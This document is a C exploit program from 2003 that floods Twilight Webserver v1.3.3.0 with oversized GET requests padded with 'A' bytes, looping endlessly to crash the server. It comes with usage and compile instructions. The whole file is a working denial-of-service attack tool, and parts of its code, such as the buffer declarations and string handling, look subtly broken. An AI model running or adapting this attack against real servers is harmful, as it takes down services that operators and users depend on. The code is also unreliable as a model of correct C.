/****************************************************************************
*       Title: Denial of Service Attack against Twilight Webserver v1.3.3.0
*       Author: posidron
*
*       Date: 2003-07-07
*       Reference: http://www.twilightutilities.com
*       Version: Twilight Webserver v1.3.3.0
*       Related Info: http://www.tripbit.org/advisories/twilight_advisory.txt
*
*       Exploit: twilight.c
*       Compile: gcc twilight -o twilight
*
*       Tripbit Security Development
*
*       Contact
*       [-] Mail: posidron@tripbit.org
*       [-] Web: http://www.tripbit.org
*       [-] IRC: irc.euirc.net 6667 #tripbit
*
*       Program received signal SIGSEGV, Segmentation fault.
*       0x41d780 in ?? ()
*****************************************************************************/

#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h> 

int main(int argc, char *argv[])
{
        int sockfd;
        struct sockaddr_in srv;
        struct hostent *host;  
        char send[1052], *flood[1037], get[3] = "GET", http[12] = "HTTP/1.0\r\n";

        memset(flood, 0x41, 1037);

        strncpy(send, get, sizeof(send) -1);
        strncat(send, flood, sizeof(send) - strlen(send) -1);
        strncat(send, http, sizeof(send) - strlen(send) -1); 

        if(argc < 3)
        {
                printf("Usage: %s [target] <port>\n", argv[0]);
                exit(0); 
        }
         
        if((host = gethostbyname(argv[1])) == NULL)
        {
                printf("Unknown host!\n");
                exit(0);
        }
         
        srv.sin_family = AF_INET;
        srv.sin_port = htons(atoi(argv[2]));
        srv.sin_addr.s_addr = inet_addr((char*)argv[1]);

        printf("DoS against Twilight Webserver v1.3.3.0\n");  

        for(;;)
        {
                if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
                {
                        printf("Can't start socket()!\n"); exit(0);
                }
                 
                if(connect(sockfd,(struct sockaddr*)&srv, sizeof(srv)) < 0)
                {
                        printf("Connection to server broken!\n"); close(sockfd);
                }

                if(write(sockfd, send, strlen(send)) < 0)
                {
                        break;
                }

                close(sockfd);
        }

        printf("Attack done!...\n");

        return 0;
}
